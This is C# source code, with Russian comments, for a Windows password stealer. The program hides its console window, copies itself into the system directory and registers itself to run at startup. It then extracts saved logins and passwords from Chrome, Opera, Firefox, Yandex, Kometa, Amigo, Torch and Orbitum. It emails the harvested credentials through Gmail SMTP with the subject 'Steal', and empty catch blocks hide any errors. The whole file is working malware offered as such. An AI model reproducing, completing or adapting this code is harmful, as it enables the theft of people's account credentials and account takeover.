using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;

namespace ConsoleApplication19
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        //hide cmd
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
  
        //[DllImport("user32.dll")]
        //public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
        //[DllImport("user32.dll")]
        //static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        static int Main(string[] args)
        {
            try
            {
                ShowWindow(GetConsoleWindow(), 0);
                string users;
                if (File.Exists(@"C:\Users\Public\config.txt"))
                {
                    users = File.ReadAllText(@"C:\Users\Public\config.txt");
                    string[] us = users.Split('\n');

                    for (int i = 0; i < us.Length; i++)
                    {

                        us[i] = us[i].Substring(0, us[i].Length - 1);
                        //Console.WriteLine(us[i]);
                        //Console.WriteLine(us[i].Length);
                        if (us[i].Equals(Environment.UserName))
                        { //Console.WriteLine(us[i]);
                          //Console.ReadKey();
                            return 0;//окончание программы.
                        }
                    }
                    users = users.Replace("1111111", Environment.UserName + Environment.NewLine + "1111111");
                    File.WriteAllText(@"C:\Users\Public\config.txt", users);
                    //Console.WriteLine(us[0]);
                    //Console.WriteLine(us[1]);
                    //Console.WriteLine(users);
                    //Console.WriteLine(Environment.UserName);
                    //Console.WriteLine(Environment.UserName.Length);
                }
                else
                {
                    File.WriteAllText(@"C:\Users\Public\config.txt", Environment.UserName + Environment.NewLine + "1111111");
                    //Console.WriteLine("------------");
                }
                //Console.WriteLine("1");
                if (!File.Exists(Environment.SystemDirectory + @"\workout.exe"))
                {
                    File.Copy(Environment.CurrentDirectory + @"\workout.exe", Environment.SystemDirectory + @"\workout.exe");
                }

                try
                {
                    string keyName = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\";
                    string valueName = "workout";
                    if (Registry.GetValue(keyName, valueName, null) == null)
                    {
                        Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true).SetValue("workout.exe", Environment.CurrentDirectory + @"\workout.exe");
                    }
                }
                catch { }
                //Console.WriteLine("2");

                try
                {
                    FtpWebRequest request =
                 (FtpWebRequest)WebRequest.Create("ТУТ ФТП С sqlite3.dll");
                    request.Credentials = new NetworkCredential("ЛОГИН", "ПАСС");
                    request.Method = WebRequestMethods.Ftp.DownloadFile;
                    //request.Timeout = 4000;
                    using (Stream ftpStream = request.GetResponse().GetResponseStream())
                    using (Stream fileStream = File.Create("sqlite3.dll"))
                    {
                        ftpStream.CopyTo(fileStream);
                    }
                }
                catch { }
                //Thread.Sleep(4500);
                //Console.WriteLine("3");

                // Console.WriteLine("4");
                string Contents = "";
                try
                {
                    string chr1 = Environment.GetEnvironmentVariable("LocalAppData") + @"\Google\Chrome\User Data\Default\" + "Login Data";
                    string chr2 = Environment.GetEnvironmentVariable("LocalAppData") + @"\Google\Chrome\User Data\Default\" + "Login Data2";
                    if (File.Exists(chr1))
                    {
                        File.Copy(chr1, chr2, true);
                        Contents += "\nChrome:\n========================\n";
                        List<LoginData> LgList;
                        LgList = SQParse.ParseFile(chr2); //LgList=список узлов класса LoginData,LoginData имеет 3 переменных
                        foreach (LoginData LogData in LgList) //ParseFile уже заполнил List
                        {
                            if (!String.IsNullOrEmpty(LogData.Url) && !String.IsNullOrEmpty(LogData.Login) && !String.IsNullOrEmpty(LogData.Password))
                                Contents += LogData.Url + "\n" + LogData.Login + "\n" + LogData.Password + '\n' + "========================" + "\n";
                        }
                        File.Delete(chr2);
                    }
                }
                catch { }
                //Console.WriteLine("5");
                //Thread.Sleep(20000);

                //Console.WriteLine("6");
                try
                {
                    string ope1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Opera Software\Opera Stable\" + "Login Data";
                    string ope2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Opera Software\Opera Stable\" + "Login Data2";
                    if (File.Exists(ope1))
                    {
                        File.Copy(ope1, ope2, true);
                        Contents += "\nOpera:\n========================\n";
                        List<LoginData> LgList;
                        LgList = SQParse.ParseFile(ope2); //LgList=список узлов класса LoginData,LoginData имеет 3 переменных
                        foreach (LoginData LogData in LgList) //ParseFile уже заполнил List
                        {
                            if (!String.IsNullOrEmpty(LogData.Url) && !String.IsNullOrEmpty(LogData.Login) && !String.IsNullOrEmpty(LogData.Password))
                                Contents += LogData.Url + "\n" + LogData.Login + "\n" + LogData.Password + '\n' + "========================" + "\n";
                        }

                        File.Delete(ope2);

                    }
                }
                catch
                { }
                //Console.WriteLine("7");

                try
                {
                    string fir1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Mozilla\Firefox\Profiles";
                    string[] folders = Directory.GetDirectories(fir1, "*", SearchOption.TopDirectoryOnly);
                    fir1 = folders[0] + @"\logins.json";
                    string fir2 = fir1.Replace("logins.json", "logins2.json");

                    if (File.Exists(fir1))
                    {

                        File.Copy(fir1, fir2, true);
                        Contents += "\nFirefox:\n========================\n";
                        List<BrowserLog> LgList;

                        string fir3 = fir2.Substring(0, fir2.Length - 13);
                        FireFox obj = new FireFox(fir3);
                        LgList = obj.GetPasswords();

                        foreach (BrowserLog LogData in LgList) //ParseFile уже заполнил List
                        {

                            Contents += LogData.Host + "\n" + LogData.Login + "\n" + LogData.Password + '\n' + "========================" + "\n";

                        }
                        File.Delete(fir2);
                    }
                }
                catch { }
                // Console.WriteLine("8");
                try
                {
                    string yan1 = Environment.GetEnvironmentVariable("LocalAppData") + @"\Yandex\YandexBrowser\User Data\Default\" + "Login Data";
                    string yan2 = Environment.GetEnvironmentVariable("LocalAppData") + @"\Yandex\YandexBrowser\User Data\Default\" + "Login Data2";
                    if (File.Exists(yan1))
                    {
                        File.Copy(yan1, yan2, true);
                        Contents += "\nYandex:\n========================\n";
                        List<LoginData> LgList;
                        LgList = SQParse.ParseFile(yan2); //LgList=список узлов класса LoginData,LoginData имеет 3 переменных
                        foreach (LoginData LogData in LgList) //ParseFile уже заполнил List
                        {
                            if (!String.IsNullOrEmpty(LogData.Url) && !String.IsNullOrEmpty(LogData.Login) && !String.IsNullOrEmpty(LogData.Password))
                                Contents += LogData.Url + "\n" + LogData.Login + "\n" + LogData.Password + '\n' + "========================" + "\n";
                        }
                        File.Delete(yan2);
                    }
                }
                catch { }
                //Console.WriteLine("9");
                try
                {
                    string kom1 = Environment.GetEnvironmentVariable("LocalAppData") + @"\Kometa\User Data\Default\" + "Login Data";
                    string kom2 = Environment.GetEnvironmentVariable("LocalAppData") + @"\Kometa\User Data\Default\" + "Login Data2";
                    if (File.Exists(kom1))
                    {
                        File.Copy(kom1, kom2, true);
                        Contents += "\nKometa:\n========================\n";
                        List<LoginData> LgList;
                        LgList = SQParse.ParseFile(kom2); //LgList=список узлов класса LoginData,LoginData имеет 3 переменных
                        foreach (LoginData LogData in LgList) //ParseFile уже заполнил List
                        {
                            if (!String.IsNullOrEmpty(LogData.Url) && !String.IsNullOrEmpty(LogData.Login) && !String.IsNullOrEmpty(LogData.Password))
                                Contents += LogData.Url + "\n" + LogData.Login + "\n" + LogData.Password + '\n' + "========================" + "\n";
                        }
                        File.Delete(kom2);
                    }
                }
                catch { }


                //Console.WriteLine("10");
                try
                {
                    string ami1 = Environment.GetEnvironmentVariable("LocalAppData") + @"\Amigo\User\User Data\Default\" + "Login Data";
                    string ami2 = Environment.GetEnvironmentVariable("LocalAppData") + @"\Amigo\User\User Data\Default\" + "Login Data2";
                    if (File.Exists(ami1))
                    {
                        File.Copy(ami1, ami2, true);
                        Contents += "\nAmigo:\n========================\n";
                        List<LoginData> LgList;
                        LgList = SQParse.ParseFile(ami2); //LgList=список узлов класса LoginData,LoginData имеет 3 переменных
                        foreach (LoginData LogData in LgList) //ParseFile уже заполнил List
                        {
                            if (!String.IsNullOrEmpty(LogData.Url) && !String.IsNullOrEmpty(LogData.Login) && !String.IsNullOrEmpty(LogData.Password))
                                Contents += LogData.Url + "\n" + LogData.Login + "\n" + LogData.Password + '\n' + "========================" + "\n";
                        }
                        File.Delete(ami2);
                    }
                }
                catch { }
                // Console.WriteLine("11");
                try
                {
                    string tor1 = Environment.GetEnvironmentVariable("LocalAppData") + @"\Torch\User Data\Default\" + "Login Data";
                    string tor2 = Environment.GetEnvironmentVariable("LocalAppData") + @"\Torch\User Data\Default\" + "Login Data2";
                    if (File.Exists(tor1))
                    {
                        File.Copy(tor1, tor2, true);
                        Contents += "\nTorch:\n========================\n";
                        List<LoginData> LgList;
                        LgList = SQParse.ParseFile(tor2); //LgList=список узлов класса LoginData,LoginData имеет 3 переменных
                        foreach (LoginData LogData in LgList) //ParseFile уже заполнил List
                        {
                            if (!String.IsNullOrEmpty(LogData.Url) && !String.IsNullOrEmpty(LogData.Login) && !String.IsNullOrEmpty(LogData.Password))
                                Contents += LogData.Url + "\n" + LogData.Login + "\n" + LogData.Password + '\n' + "========================" + "\n";
                        }
                        File.Delete(tor2);
                    }
                }
                catch { }
                //Console.WriteLine("12");
                try
                {
                    string orb1 = Environment.GetEnvironmentVariable("LocalAppData") + @"\Orbitum\User Data\Default\" + "Login Data";
                    string orb2 = Environment.GetEnvironmentVariable("LocalAppData") + @"\Orbitum\User Data\Default\" + "Login Data2";
                    if (File.Exists(orb1))
                    {
                        File.Copy(orb1, orb2, true);
                        Contents += "\nOrbitum:\n========================\n";
                        List<LoginData> LgList;
                        LgList = SQParse.ParseFile(orb2); //LgList=список узлов класса LoginData,LoginData имеет 3 переменных
                        foreach (LoginData LogData in LgList) //ParseFile уже заполнил List
                        {
                            if (!String.IsNullOrEmpty(LogData.Url) && !String.IsNullOrEmpty(LogData.Login) && !String.IsNullOrEmpty(LogData.Password))
                                Contents += LogData.Url + "\n" + LogData.Login + "\n" + LogData.Password + '\n' + "========================" + "\n";
                        }
                        File.Delete(orb2);
                    }
                }
                catch { }

                //Console.WriteLine("13");
                try
                {
                    MailMessage mail1 = new MailMessage();
                    SmtpClient SmtpServer1 = new SmtpClient("smtp.gmail.com");
                    mail1.From = new MailAddress("МЫЛО");
                    mail1.To.Add("МЫЛО");
                    mail1.Subject = "Steal";
                    mail1.Body = Contents;
                    SmtpServer1.Port = 587;
                    SmtpServer1.Credentials = new NetworkCredential("ЛОГИН", "ПАРОЛЬ");
                    SmtpServer1.EnableSsl = true;
                    SmtpServer1.Send(mail1);
                }
                catch { }
            }
            catch { }

            //Console.ReadKey();
            //Console.WriteLine("14");
            return 0;
          
            //Process.Start(new ProcessStartInfo()
            //{
            //    Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Application.ExecutablePath,
            //    WindowStyle = ProcessWindowStyle.Hidden,
            //    CreateNoWindow = true,
            //    FileName = "cmd.exe"
            //});


            //{
            //    Environment.GetEnvironmentVariable("LocalAppData") + "\\Google\\Chrome\\User Data\\Default\\Login Data",
            //    Environment.GetEnvironmentVariable("LocalAppData") + "\\Yandex\\YandexBrowser\\User Data\\Default\\Login Data",
            //    Environment.GetEnvironmentVariable("LocalAppData") + "\\Kometa\\User Data\\Default\\Login Data",
            //    Environment.GetEnvironmentVariable("LocalAppData") + "\\Amigo\\User\\User Data\\Default\\Login Data",
            //    Environment.GetEnvironmentVariable("LocalAppData") + "\\Torch\\User Data\\Default\\Login Data",
            //    Environment.GetEnvironmentVariable("LocalAppData") + "\\Orbitum\\User Data\\Default\\Login Data",
            //    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Login Data"
            /*  };*/ // - Массив с путями к SQLite базам разных браузеров
                     //string Contents = String.Empty;
                     //foreach (string Path in PathList)
                     //{
                     //    List<LoginData> LgList;
                     //     LgList = SQParse.ParseFile(Path); //LgList=список узлов класса LoginData,LoginData имеет 3 переменных
                     //    foreach (LoginData LogData in LgList) //ParseFile уже заполнил List
                     //    {
                     //        if (!String.IsNullOrEmpty(LogData.Url) && !String.IsNullOrEmpty(LogData.Login) && !String.IsNullOrEmpty(LogData.Password))
                     //            Contents += LogData.Url + " " + LogData.Login + " " + LogData.Password + '\n';
                     //    }
                     //}
                     //Console.WriteLine(Contents);
                     //Console.ReadKey();
                     //break;
        }
    }
}